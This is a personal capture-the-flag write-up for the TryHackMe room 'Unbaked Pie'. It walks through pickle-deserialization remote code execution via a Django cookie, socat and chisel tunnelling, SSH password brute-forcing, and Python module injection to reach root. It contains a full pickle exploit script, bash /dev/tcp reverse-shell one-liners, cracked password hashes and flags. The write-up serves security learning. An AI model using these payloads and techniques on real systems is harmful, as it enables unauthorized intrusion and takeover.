# Tryhackme.com Room : Unbaked Pie
`https://tryhackme.com/room/unbakedpie`


# Instance
```
export IP=10.10.69.232
```

# Nmap
```
5003/tcp open  filemaker?
```

We have a website running on port `5003`.

When trying random login we get this error message
```
{'invalid_login': 'Please enter a correct %(username)s and password. Note that both fields may be case-sensitive.', 'inactive': 'This account is inactive.'} 
```

The signup page doesn't seem to work, we always get 
```
{'password_mismatch': 'The two password fields didn’t match.'} 
```

Maybe the parameters passed by the request is wrong ? (`password1` and `password2`)

When trying to reach `/accounst/forgot` we get
```

Page not found (404)
Request Method: 	GET
Request URL: 	http://10.10.65.69:5003/accounts/forgot

Using the URLconf defined in bakery.urls, Django tried these URL patterns, in this order:

    admin/
    [name='home']
    share [name='share']
    search [name='search']
    about [name='about']
    <slug:slug> [name='detail']
    accounts/ signup/ [name='signup']
    accounts/ login/ [name='login']
    accounts/ logout/ [name='logout']
    ^static/(?P<path>.*)$
    ^media/(?P<path>.*)$

The current path, accounts/forgot, didn't match any of these.

You're seeing this error because you have DEBUG = True in your Django settings file. Change that to False, and Django will display a standard 404 page.
```

We get a list of the routes. Also the `DEBUG` argument of `django` might expose some stuff

when we go to `/admin/` we get a login prompt for `Django administration`. Wonder if there is default credentials for this ?

We get 
```
Please enter the correct username and password for a staff account. Note that both fields may be case-sensitive. 
```

On the homepage we got some usenames
```
ramsey
wan
olivier
```

Also what is this line in the routes ?
```
<slug:slug> [name='detail']
```

It's a wildcard catch all that call this function :
```
article = Article.objects.get(slug=slug)
```

which use `django/db/models/query.py` to query the database

We get more info on the query error page
```
CONTENT_LENGTH ''
CONTENT_TYPE 'text/plain'
CSRF_COOKIE 'G5odtdyGTlr1SiRxxS8RVzEas26wOYrl7FaZ7WuZJhjz1gwETea7nRuHQAyjEvd8'
DJANGO_SETTINGS_MODULE 'bakery.settings'
GATEWAY_INTERFACE 'CGI/1.1'
GPG_KEY '********************'
HOME '/root'
HOSTNAME '8b39a559b296'
HTTP_ACCEPT 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
HTTP_ACCEPT_ENCODING 'gzip, deflate'
HTTP_ACCEPT_LANGUAGE 'en-US,en;q=0.5'
HTTP_CONNECTION 'keep-alive'
HTTP_COOKIE 	
('csrftoken=G5odtdyGTlr1SiRxxS8RVzEas26wOYrl7FaZ7WuZJhjz1gwETea7nRuHQAyjEvd8; '
 'search_cookie="gASVDwAAAAAAAACMCycgb3IgJzEnPScxlC4="')
HTTP_HOST '10.10.65.69:5003'
HTTP_UPGRADE_INSECURE_REQUESTS '1'
HTTP_USER_AGENT 'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0'
LANG 'C.UTF-8'
PATH '/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin'
PATH_INFO '/german-chocolate-pie2'
PWD '/home'
PYTHON_GET_PIP_SHA256 '6e0bb0a2c2533361d7f297ed547237caf1b7507f197835974c0dd7eba998c53c'
PYTHON_GET_PIP_URL 'https://github.com/pypa/get-pip/raw/fa7dc83944936bf09a0e4cb5d5ec852c0d256599/get-pip.py'
PYTHON_PIP_VERSION '20.2.3'
PYTHON_VERSION '3.8.6'
QUERY_STRING ''
REMOTE_ADDR '10.6.32.20'
REMOTE_HOST ''
REQUEST_METHOD 'GET'
RUN_MAIN 'true'
SCRIPT_NAME ''
SERVER_NAME '8b39a559b296'
SERVER_PORT '5003'
SERVER_PROTOCOL 'HTTP/1.1'
SERVER_SOFTWARE 'WSGIServer/0.2'
TZ 'UTC'
wsgi.errors 	
<_io.TextIOWrapper name='<stderr>' mode='w' encoding='utf-8'>
wsgi.file_wrapper 	
<class 'wsgiref.util.FileWrapper'>
wsgi.input 	
<django.core.handlers.wsgi.LimitedStream object at 0x7f15f70e0ac0>
wsgi.multiprocess 	
False
wsgi.multithread 	
True
wsgi.run_once 	
False
wsgi.url_scheme 'http'
wsgi.version 	
(1, 0)
```

Got a bunch of settings (Too many to list here)

```
Sqlite database -> /home/site/db.sqlite3
BaseDir = /home/site
Default Hashing : sha256
Smtp server on port 25 (localhost only)
Renderer : django.forms.renderers.DjangoTemplates
Session cookie serializer : django.contrib.sessions.serializers.JSONSerializer
```

Tryied traversing directory from the `/media/` route but didn't work

There is a lot of mention to pickle (Also in the challenge tag) so I guess there is some serialization of a pickle object somewhere.

Well there is definitely the detail but how do we get access to that ?

Trying to create a custom wordlist by crawling the website with `cewl` maybe we can bruteforce our way into the django admin page ?


After some time, finally figured out the place to input some stuff. The `search_cookie` is a base64 encoded pickled string.

We got to find a way to craft an object that can exploit this.

Tried with a pickled object with `__reduce__` but didn't seem to work. What method is called on this string ?

Ok soo, took a break and came back to this challenge the day after.

My problem was that I was setting the `search_cookie` on the `post` request but it was overritten by the query parameter.
The key was to do a `GET` on `/search` which trigger an error but decode the cookie.

So we got a reverse shell by using this code :
```py
import base64
import requests
import argparse
import pickle


parser = argparse.ArgumentParser("Exploit")

parser.add_argument('--server_ip', type=str, default="10.10.64.206")
parser.add_argument('--my_ip', type=str, default="10.6.32.20")

args = parser.parse_args()

class RevShell:
	def __reduce__(self):
		import os
		return os.system, (f"bash -c 'bash -i >& /dev/tcp/{args.my_ip}/8888 0>&1'",)

port="5003"

url = f"http://{args.server_ip}:{port}"

payload = base64.b64encode(pickle.dumps(RevShell())).decode()

print("Getting CSRF token")
s = requests.session()
r = s.get(url)
middleware_token = r.text.split('csrfmiddlewaretoken" value="')[-1].split('"')[0]

s.cookies['search_cookie'] = payload

print("Triggering reverse shell...")
r = s.get(f"{url}/search", data= {'csrfmiddlewaretoken': middleware_token})

```

And we get "root" access on the box. Doesn't seem right, probably in some kind of container.

We retrieve the sqlite database for further analysis. Couldn't open a new python http server on port 8000 so i just copied the db to`/media` and downloaded it via the browser.

In the db we find these users :
```
aniqfakhrul <-- SUPER USER
testing
ramsey
oliver
wan
```

We have a `.dockerenv` file on the box which mean we are in docker

Also `cat /proc/1/cgroup` tell us that we are in docker

The `~/.ssh/known_hosts` contains:
```
|1|7txb+Y2jDUkv7dZX8nHJArVqNQQ=|lKaY9N64Cr++Q2NY53t2eHQd0AA= ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFeOcZoaD3J2dGDWYGzHCP3tGGqwlbzTo1t2kv5+P+zX56hZRv1m46gvvKMXH5m6XMIE4TRIyGPjJlK23nbUF/g=
```

We don't have an ssh client on the box but it seems like `172.17.0.1` is running ssh
```
nc 172.17.0.1 22
SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.10
```

Not sure how we would login tho... we don't have any ssh keys...
Maybe we can crack the passwords in the sqlite db ?

There is a `/home/.git` with the following commits :
```
commit 6fec1d3f0324dff6c93c83922ae85960f5ac4904 (HEAD ->
master, origin/master)
Author: Aniq Fakhrul <aniqfakhrul@mcoba.org>
Date:   Fri Oct 2 08:55:02 2020 -0700

    Commit Second

commit d9f9e69bb6385ad1d4d25aa720f835b59cd5c5c6
Author: Aniq Fakhrul <aniqfakhrul@mcoba.org>
Date:   Fri Oct 2 08:52:31 2020 -0700

    Commit Second

commit 03deffebda053caa43d6948c8bb1b26fe34d1988
Author: Aniq Fakhrul <aniqfakhrul@mcoba.org>
Date:   Fri Oct 2 07:10:08 2020 -0700

    First commit
```

nothing there.

Found a static `nmap` binary at `https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap`
Scanned `172.17.0.1` seems like only port `22` is open.

Maybe we need to crack the password in the database and login using those credentials ?
```
aniqfakhrul:pbkdf2_sha256$216000$3fIfQIweKGJy$xFHY3JKtPDdn/AktNbAwFKMQnBlrXnJyU04GElJKxEo=
testing:pbkdf2_sha256$216000$0qA6zNH62sfo$8ozYcSpOaUpbjPJz82yZRD26ZHgaZT8nKWX+CU0OfRg=
ramsey:pbkdf2_sha256$216000$hyUSJhGMRWCz$vZzXiysi8upGO/DlQy+w6mRHf4scq8FMnc1pWufS+Ik=
oliver:pbkdf2_sha256$216000$Em73rE2NCRmU$QtK5Tp9+KKoP00/QV4qhF3TWIi8Ca2q5gFCUdjqw8iE=
wan:pbkdf2_sha256$216000$oFgeDrdOtvBf$ssR/aID947L0jGSXRrPXTGcYX7UkEBqWBzC+Q2Uq+GY=
```

Tried to crack the passwords with john the ripper but didn't have much luck so far.

I looked up a writeup and found that the first thing they did on the box was looking at the `/root/.bash_history` (DUH ! should have looked..). In there we see:
```
ssh ramsey@172.17.0.1
apt remove --purge autoremove open-ssh*
apt remove --purge autoremove openssh=*
apt remove --purge autoremove openssh-*
ssh
apt autoremove openssh-client
```

So we already new that there was another box on `172.17.0.0.1` but this confirms it. Especially the fact that they removed ssh.

Let's get an ssh binary, even thos we still need ramsey password...still running...

Ok soo, trying to bruteforce the password might not be the efficient  way to do this.

In the settings file, we got the `Secret Key`
```
SECRET_KEY = '^8u-+yqrnww%+zn6gw=htqt6u+c^!q*5o3y9y$tt$z7$9klhqk'    
```

Maybe we can recover something with this ?

Oh well, it was the way to go. I switched to hascat an ran the ramsey hash. Took quite a while annnddd... didn't fint anything

So i looked again at the write up and they mention that they cracked `testing` account.

Running hashcat on `testing` hash, we find
```
lala12345
```

Trying to login via ssh onto the box doesn't work with any users :/

Login in as `testing` on the webapp, we don't have access to `/admin/` but we get access to the `Share` view. From there we can upload a file but I don't think this is the way to go, we might be able to upload a revshell but we would get back into the docker container.

Again, looking at some writeups, its seems that this password doesn't lead anywhere, we need to bruteforce `ramsey@172.17.0.1`.

The writeup that I was reading proposed using `chisel`. Wanted to try a bit more handon approach.

I also found some interesting files in `/tmp`.
There is a `socat` binary and also an `elf` file which might be a `metasploit` payload.

Would be easy if we could open ports on the docker instance but we can't.
Here are the steps i found to create a reverse tunnel (https://book.hacktricks.xyz/tunneling-and-port-forwarding):
```
Attacker -> sudo socat tcp-listen:443,reuseaddr,fork tcp-listen:2222,reuseaddr
Victim   -> while true; do /tmp/socatx86.bin TCP4:10.6.32.20:443 TCP4:172.17.0.1:22 ; done
Atacker  -> ssh -p 2222 ramsey@localhost
```

And we get a password prompt but somehow, `patator` can't bruteforce it, we get connection refused... hmm weird..

Tried also with hydra but didn't work either (Well, was taking quite some time and write ups mention that they find the password almost instaneously using rockyou soo i guess we were getting connection refused but couldn't see the errors...)

Hmmm, let's try with `chisel : https://github.com/jpillora/chisel`
```
Attacker -> sudo ./chisel server -p 1880 --reverse
Victim   -> ./chisel 10.6.32.20:1880 R:2222:172.17.0.1:22
Attacker -> ssh -p 2222 ramsey@localhost
```

Somehow, this does work with patator and we find the password
```
12345678
```

There is also a way to do this using `metasploit` and the payload in `/tmp` is probably there for that.

And we are now loged in as `ramsey` on the host

We find the user flag
```
THM{ce778dd41bec31e1daed77ebebcd7423}
```

Now in the home directory, we have a `vuln.py` file and `payload.png` file.
```
-rw-r--r-- 1 root   ramsey 4369 Oct  3 23:27 vuln.py
```

Running it, we see that there is a `calculator` mode and a `Easy calculator` mode.

The `calculator` mode take inputs manually while the `Easy calculator` take an image and do OCR on it using `pytesseract`.

Maybe we can find a way to craft a malicious image OR we can inject a python package in there.
Maybe modify site packages ? Or add a new path to `sys.path` so that our injected module is loaded instead of the default one.

Here are the imports in the file
```
try:
    from PIL import Image
except ImportError:
    import Image
import pytesseract
import sys
import os
import time
```

I was toying arroung adding an `__init__.py` file but the simplest way is just to modify dependencies.

We can modify `pytesseract` in `~/.local/lib/python2.7/site-packages/pytesseract`

Added this 
```
import os
os.system('id')
```

But running the script as user `ramsey` doesn't elevate our priviledges.

We find this running `sudo -l`:
```
(oliver) /usr/bin/python /home/ramsey/vuln.py
```

But when we run the vulnerable script using `sudo -u oliver /usr/bin/python /home/ramsey/vuln.py`

Our code is not injected which is quite normal since its in `ramsey` `.local` directory.

We can't write in `/home/oliver` but looking at the permissions in `/home/ramsey/.local` i realised it wouldn't be accessible from `oliver`.
So i just `chmod 777 -R /home/ramsey/.local` (Bit hacky, there is def more granular way of doing this) and we get code execution as oliver :
```
uid=1002(oliver) gid=1002(oliver) groups=1002(oliver),1003(sysadmin)
```

Now let's get another reverse shell. We replace the code in pyteserract to
```
os.system("bash -c 'bash -i >& /dev/tcp/10.6.32.20/5555 0>&1' ")
```

Now that we are logged in as oliver, we run `sudo -l` and apparently it doesn't need a password
```
(root) SETENV: NOPASSWD: /usr/bin/python /opt/dockerScript.py
```

Apparently, `SETENV` preserve the environment variables so I guess we will use them to exploit the `dockerScript.py`

Here is the content of the file :
```
import docker

# oliver, make sure to restart docker if it crashes or anything happened.
# i havent setup swap memory for it
# it is still in development, please dont let it live yet!!!
client = docker.from_env()
client.containers.run("python-django:latest", "sleep infinity", detach=True)
```

Soo, maybe we can find a way to get a specially crafter client with env variables
OR
We can try to inject stuff in the docker package.

We don't have access to `docker` package from the `oliver` user but we can set our `PYTHONPATH` variable to point to a `docker` folder with an `__init__.py` file

Hmmmm, for some reason, the docker package is not found when I run it with `sudo` but it work if I `import docker` in a local python interpreter (as `oliver`).

Hmmm, let's check in available python paths if we can inject something :
```
['', '/home/oliver', '/usr/lib/python2.7', '/usr/lib/python2.7/plat-x86_64-linux-gnu', '/usr/lib/python2.7/lib-tk', '/usr/lib/python2.7/lib-old', '/usr/lib/python2.7/lib-dynload', '/home/ramsey/.local/lib/python2.7/site-packages', '/usr/local/lib/python2.7/dist-packages', '/usr/lib/python2.7/dist-packages']
```

Sooo, it's simpler than I thought. Since `/home/ramsey/.local/lib/python2.7/site-packages` is already in the path and the `docker` package is absent from the paths, no need to try to inject another pythonpath.

We can inject our `docker/__init__.py` in `/home/ramsey/.local/lib/python2.7/site-packages`.

Running `sudo /usr/bin/python /opt/dockerScript.py` as `Oliver` we get
```
uid=0(root) gid=0(root) groups=0(root)
```

Now we just need to inject another revshell:
```
os.system("bash -c 'bash -i >& /dev/tcp/10.6.32.20/4444 0>&1' ")
```

And we got root.

Root flag :
```
THM{1ff4c893b3d8830c1e188a3728e90a5f}
```


Well, that was a really interesting box.
	- We can do a port scan with `nc` !
		- `nc -zv 172.17.0.1 1-65535`
	- Good practise with object serialization injection.
		- In the beginning, couldn't figure out the path to injection, my cookie was always overriten. Didn't think of using an error code path to trigger the serialization.
	- Learned a lot about redirecting/forwarding port/hosts
		- `Chisel` is pretty cool
	- Learned a bit about how docker works (When i was trying to get out of there)
	- Learned and setuped hascat
	- ALWAYS CHECK .bash_history
	- Good reminder of how to inject code in python. How would it work in Python3 ? There is no __init__ files ?
	- Found some cool ressources with prebuilt static binaries.
		- Didn't mention it but i managed to get `dropbear ssh client` on there. But needed to bruteforce...
	- Ressources
		- This one mention proxychains which look cool ! (But i guess chisel does the job)
			- https://fawaz.blog/tryhackme-unbaked-pie/
		- This was a handy guide ! 
			- https://book.hacktricks.xyz/tunneling-and-port-forwarding
		- USE BURP PROXY TO GIVE INTERNET TO APT !! REALLY COOL !!
			- https://jarilaurila.medium.com/writeup-thm-unbaked-pie-5ec811b8a227
			- `echo 'Acquire::http::Proxy "http://10.8.108.247:8080/";' > /etc/apt/apt.conf.d/proxy.conf`
